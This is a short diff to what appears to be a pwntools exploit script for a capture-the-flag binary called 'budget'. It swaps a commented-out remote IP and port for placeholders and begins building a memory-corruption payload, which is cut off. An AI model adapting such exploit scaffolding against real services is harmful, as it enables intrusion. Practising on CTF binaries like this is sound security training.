@@ -2,7 +2,7 @@ from pwn import *
 
 elf = ELF("./budget")
 p = process("./budget")
-#p = remote('20.199.41.155', 5052)
+#p = remote('ip', port)
 addr = elf.symbols["__bss_start"]
 print(hex(addr))
 payload =flat(
